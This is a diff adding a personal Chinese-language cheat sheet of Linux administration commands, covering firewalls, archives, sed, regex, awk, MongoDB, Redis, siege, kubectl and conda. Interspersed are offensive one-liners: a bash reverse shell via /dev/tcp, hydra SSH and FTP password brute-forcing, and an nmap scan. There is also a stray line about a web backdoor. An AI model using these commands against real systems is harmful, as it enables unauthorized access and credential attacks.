@@ -1,0 +1,342 @@
+lsb_release -a  查看操作系统
+
+lsmod | grep -v "Module"|wc -l
+
+iptables -I INPUT -s 106.75.37.57 -j DROP        iptables -I INPUT -s 106.75.37.57 -j ACCEPT   封禁/解封IP
+
+bash -i >& /dev/tcp/192.168.101.132/4444 0>&1         shell 反弹
+
+nmap -sT 192.168.227.135 -p 1001,1002,1003,1004,1005      扫描192.126.227.135主机的1001，1002，1003，1004，1005端口
+
+1、开启防火墙 
+    systemctl start firewalld
+2、开放指定端口
+      firewall-cmd --zone=public --add-port=1935/tcp --permanent
+ 命令含义：
+--zone #作用域
+--add-port=1935/tcp  #添加端口，格式为：端口/通讯协议
+--permanent  #永久生效，没有此参数重启后失效
+3、重启防火墙
+      firewall-cmd --reload
+4、查看端口号
+netstat -ntlp   //查看当前所有tcp端口·
+netstat -ntulp |grep 1935   //查看所有1935端口使用情况·
+
+# 查询端口是否开放
+firewall-cmd --query-port=8080/tcp
+# 开放80端口
+firewall-cmd --permanent --add-port=80/tcp
+# 移除端口
+firewall-cmd --permanent --remove-port=8080/tcp
+
+
+创建虚拟网卡
+ifconfig eth33:1 58.240.131.58  netmask 255.255.255.0
+
+make && make install
+
+hydra -L users.txt -P passwords.txt -t 10 -vV -e ns 192.168.109.132 ssh
+
+ntpdate cn.pool.ntp.org && hwclock --systohc && hwclock -w
+
+ssh -R 22:localhost:808 root@192.168.101.133
+
+mkdir  新建文件夹 作为设备的挂载地点   mknod  模拟建立一个设备，挂载到上述的文件夹中
+
+./hydra 192.168.52.133 ftp -l maol -P passwords.txt -t 10 -s 21 -v
+
+./hydra -L users.txt -P passwords.txt -t 10 -vV -e ns 10.89.128.31 ssh
+
+find ./ -name "*.log" -o -name "*.out"   查找某个目录下以某个后缀结尾的所有文件
+
+
+ss -ntl  机器的端口使用情况
+
+创建文件名"test"，文件大小1000MB：
+dd if=/dev/zero of=test bs=1M count=1000
+
+
+【P1】web后门-实时监控-超过2k过雷火基础验证
+
+yum -y install ntpdate      ntpdate time2.aliyun.com 
+fallocate -l 10G bigfile
+dd if=/dev/zero of=file.test bs=10M count=1    
+echo  -e  将输入文字中的一些字符转义，如  /n表示换行
+
+
+# tar -zcvf renwolesshel.tar.gz /renwolesshel
+解压tar.gz格式压缩包
+# tar zxvf renwolesshel.tar.gz
+打包成tar.bz2格式压缩包
+# tar -jcvf renwolesshel.tar.bz2 /renwolesshel
+解压tar.bz2格式的压缩包
+# tar jxvf renwolesshel.tar.bz2
+压缩成zip格式
+# zip -q -r renwolesshel.zip renwolesshel/
+解压zip格式的压缩包
+# unzip renwolesshel.zip
+
+
+
+
+
+sed学习总结
+
+    -e<script>或--expression=<script> 以选项中指定的script来处理输入的文本文件。
+    -f<script文件>或--file=<script文件> 以选项中指定的script文件来处理输入的文本文件。
+    -n或--quiet或--silent 仅显示script处理后的结果。。
+
+        a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～
+        c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！
+        d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚；
+        i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；
+        p ：打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～
+        s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g 就是啦！
+    a ：新增    sed -e 4a\newLine test.txt  在test.txt文件的第四行后添加newLine
+    i ：插入    nl /etc/passwd | sed '2a Drink tea or ......\drink beer ?'  在第二行前插入两行，以\分开
+    d ：删除    nl /etc/passwd | sed '2,5d'  删除第2至第5行；
+                nl /etc/passwd | sed '3,$d'  删除第3行直到最后一行；
+    c ：取代    nl /etc/passwd | sed '2,5c No 2-5 number'   将2至5行替换为No 2-5 number
+    p ：打印    nl /etc/passwd | sed -n '5,7p'  打印5至7行
+                nl /etc/passwd | sed -n '/root/p'   P可以用于搜索，例如搜索root -n则是显示p搜索的结果，如上所示
+                nl /etc/passwd | sed  '/root/d'   搜索并删除   所搜root并删除d
+                nl /etc/passwd | sed -n '/root/{s/bash/blueshell/;p;q}'  搜索并执行后面的操作，替换s///；显示p；退出q;
+                
+    替换
+        sed 's/要被取代的字串/新的字串/g'   sed  's///g'      sed 's/^.*addr://g'  sed  's/Ba.*$//g'
+        
+    多次编辑，对某行多次操作，用-e  连接  如   nl /etc/passwd | sed -e '3,$d' -e 's/bash/blueshell/'
+    
+    
+    
+    以上的内容只是将文件按照我们的要求输出到标准输出上，如果想保存操作，就需要使用管道符或者重定向；但是-i可以直接更改文件（危险）
+    sed -i 's/\.$/\!/g' regular_express.txt  文件被更改（末尾的.被替换为！）
+    
+
+
+Linux  正则表达式   https://www.cnblogs.com/hanxiaoyu/p/5759477.html
+
+    由三部分组成   1.字符类    2.数量限定符  3.位置限定符
+
+
+    1.字符类
+
+        .           匹配任意一个字符                                                abc可以匹配abcd   abc0
+        []          匹配括号中的任意一个字符                                        [abc]1可以匹配a1  b1   c1 
+        -           在括号[]中使用，标识范围                                           [0-9a-fA-F] 可以匹配一位16进制的数字
+        ^           位于[]时，匹配除了[]中的字符外的任意一个字符                    [^xy]匹配除x,y外的任意一个字符
+        [[:xxx:]]   grep 工具预定义的一些字符                                       [[:digit:]]匹配一个数字   [[:alpha:]]匹配一个字母
+
+
+    2、数量限定符
+
+        ？前面的单元匹配0次或者1次      [0-9]?\.[0-9]  匹配1.2、2.3、3.5。。。  由于.是特殊字符需要转义
+        + 前面的单元匹配1次或者多次     [a-zA-Z0-9_.-]+@[a-zA-Z0-9_.-]+\.[a-zA-Z0-9_.-]+   匹配email
+        * 前面的单元匹配0次或者多次      
+        {n} 前面的单元精确匹配n次       [1-9][0-9]{2} 匹配100-999
+        {n,} 前面的单元至少匹配n次      [1-9][0-9]{2，} 匹配>100的数
+        {,m} 前面的单元最多匹配m次
+        {n,m} 前面的单元至少匹配n次，最多匹配m次
+        
+    3、位置限定符
+
+        ^ 匹配行首的位置      ^content  匹配行首的为content的行
+        $ 匹配行末的位置      ;$匹配行末为;的行    ^$匹配空行
+        \< 匹配单词开头的位置    \<th  匹配...this... ，但是不匹配tenth
+        \> 匹配单词末尾的位置    p\>匹配leap ，但是不匹配parent
+        \b 匹配单词开头或结尾的位置     \bat\b  匹配...at...   不匹配batch
+        \B 匹配非单词开头或结尾的位置    \Bat\B  匹配battery    不匹配attenc   hat
+     
+    
+    4、特殊字符
+    
+        \  转义字符
+        () 将正则表达式的一部分括起来组成一个单元，可以对整个单元使用数量限定符
+        |  连接两个子表达式，标识或的关系    n(s|fs)  匹配sf   ss
+
+
+    5、正则中需要转义的特殊字符
+    
+        * . ? + $ ^ [ ] ( ) { } | \ /
+
+
+awk总结
+
+    awk 'BRGIN{}{}END{}' filename
+
+    awk '{[pattern] action}' {filenames}   # 行匹配语句 awk '' 只能用单引号
+        awk '{print $1,$4}' log.txt
+        awk '{printf "%-8s %-10s\n",$1,$4}' log.txt
+        
+    awk -F  #-F相当于内置变量FS, 指定分割字符
+        awk -F, '{print $1,$2}'   log.txt
+        awk -F '[ ,]'  '{print $1,$2,$5}'   log.txt   使用多个分隔符.先使用空格分割，然后对分割结果再使用","分割
+        
+    awk -v  # 设置变量
+        awk -va=1 '{print $1,$1+a}' log.txt
+        awk -va=1 -vb=s '{print $1,$1+a,$1b}' log.txt
+        
+    awk -f {awk脚本} {文件名}
+        awk -f cal.awk log.txt
+
+uniq -c -c或--count 在每列旁边显示该行重复出现的次数。
+     -d或--repeated 仅显示重复出现的行列。
+     -u或--unique 仅显示出一次的行列。
+     *  重复的行必须在一起才能起作用，sort filename.txt | uniq -c 
+
+
+
+
+mongo特殊操作
+    查询以"F"开头的某个字段：{"name" : {"$regex":"^F"}}
+    更改name字段的值为1234： {"$set":{"name":"1234"}}
+    读取 name 字段中第一个字母 ASCII 值大于 "H" 的数据：{ "name": { "$gt": "H" } }
+        (>) 大于 - $gt
+        (<) 小于 - $lt
+        (>=) 大于等于 - $gte
+        (<= ) 小于等于 - $lte
+    
+mongo查询操作：
+    我们可以使用 find() 方法来查询指定字段的数据，将要返回的字段对应值设置为 1：{ "_id": 0, "name": 1, "alexa": 1 })
+    但是，除了 _id，你不能在一个对象中同时指定 0 和 1，如果你设置了一个字段为 0，则其他都为 1，反之亦然
+    以下代码同时指定了 0 和 1 则会报错：{ "name": 1, "alexa": 0 }
+
+
+
+
+redis:
+    登录redis-cli -h host -p port -a password
+    删除 key:DEL key
+    序列化给定 key:DUMP key
+    查找key :KEYS pattern
+    检查给定 key 是否存在:EXISTS key
+    为给定 key 设置过期时间，以秒计:EXPIRE key seconds
+    以秒为单位，返回给定 key 的剩余生存时间:TTL key
+    移除 key 的过期时间，key 将持久保持:PERSIST key
+    
+管理 redis 字符串值(string): key：value
+    设置指定 key 的值:SET key value
+    获取指定 key 的值:GET key
+    将给定 key 的值设为 value ，并返回 key 的旧值(old value):GETSET key value
+    将 key 中储存的数字值减一: DECR key
+    将 key 中储存的数字值增一: INCR key
+
+Redis 哈希(Hash):key：{key1:value1,key2:value2....}
+    HMSET runoobkey name "redis tutorial" description "redis basic commands for caching" likes 20 visitors 23000
+    
+    删除一个或多个哈希表字段:HDEL key field1 [field2]
+    查看哈希表 key 中，指定的字段是否存在:    HEXISTS key field
+    获取存储在哈希表中指定字段的值:HGET key field
+    获取在哈希表中指定 key 的所有字段和值:    HGETALL key
+    获取所有哈希表中的字段:HKEYS key
+    获取哈希表中所有值:HVALS key
+    获取哈希表中字段的数量:    HLEN key
+    将哈希表 key 中的字段 field 的值设为 value:    HSET key field value
+
+Redis 列表(List):key:[value1, value2, value3....]
+
+    获取列表长度:LLEN key
+    移出并获取列表的第一个元素:LPOP key
+    将一个或多个值插入到列表头部:LPUSH key value1 [value2]
+    将一个值插入到已存在的列表头部:LPUSHX key value
+    获取列表指定范围内的元素:LRANGE key start stop
+    移除列表的最后一个元素，返回值为移除的元素。:RPOP key
+
+Redis 集合(Set): 集合成员是唯一的,无序的 key:()
+    
+    向集合添加一个或多个成员:SADD key member1 [member2]
+    获取集合的成员数:SCARD key
+    返回第一个集合与其他集合之间的差异:SDIFF key1 [key2]
+    判断 member 元素是否是集合 key 的成员: SISMEMBER key member
+    返回集合中的所有成员:SMEMBERS key
+    移除集合中一个或多个成员:SREM key member1 [member2]
+
+Redis 有序集合(sorted set  zset):不允许重复的成员,有序的：
+    
+    向有序集合添加一个或多个成员，或者更新已存在成员的分数：ZADD key score1 member1 [score2 member2]
+    获取有序集合的成员数：ZCARD key
+    计算在有序集合中指定区间分数的成员数：ZCOUNT key min max
+    有序集合中对指定成员的分数加上增量 increment：ZINCRBY key increment member
+    返回有序集中，成员的分数值：ZSCORE key member
+
+
+
+
+python:
+    a[::-1]: 翻转list 字符串
+
+
+
+
+siege
+我这边是测试了一个server端的接口并发情况.
+
+    接口地址是:http://118.212.149.xx:8080/xx/xx/xx
+    请求类型 : POST
+    请求参数 : {“accountId”:”123”,”platform”:”ios”}
+    请求次数 :10次
+    请求并发数量 : 200
+    siege "http://118.212.149.xx:8080/xx/xx/xx POST {\"accountId\":\"123\",\"platform\":\"ios\"}" -r 10 -c 200    
+    
+    Transactions:    访问次数
+    Availability:    成功次数
+    Elapsed time:    测试用时
+    Data transferred:    测试传输数据量
+    Response time:    平均响应时间
+    Transaction rate:    每秒事务处理量
+    Throughput:    吞吐率
+    Concurrency:    并发用户数
+    Successful transactions:    成功传输次数
+    Failed transactions:    失败传输次数
+    Longest transaction:    最长响应时间
+    Shortest transaction:    最短响应时间
+
+
+http_load轻量压测（网络连接）
+    
+
+
+
+
+清空  basic_data::refresh_log  refresh_task  refresh_time  可以停止KB更新
+
+k8 怎么从容器中复制文件出来: kubectl cp 命名空间/容器名:/容器目录/文件名 /宿主机目录/文件名
+
+日志级别设置：
+logging.basicConfig(level=logging.DEBUG,format='%(asctime)s - %(filename)s[line:%(lineno)d] - %(levelname)s: %(message)s')
+
+kubectl expose po $pod-name -n qtsa --port=要暴露的端口 --type=NodePort
+
+
+
+
+
+
+
+conda create --name py35 python=3.5
+conda remove --name py35 --all
+
+activate py35     激活环境 /  切换环境
+deactivate py35    退出当前环境，返回主环境
+
+conda info -e    查看系统中的所有环境
+conda install numpy   安装库
+conda list   查看已经安装的库
+conda list -n py35    查看某个环境的已安装包
+conda search numpy      搜索package的信息
+conda install -n py35 numpy     安装package到指定的环境
+conda update -n py35 numpy      更新package
+conda remove -n py35 numpy      删除package
+conda update anaconda      更新anaconda
+conda update python       更新python
+
+
+
+
+
+
+
+
+
+
+
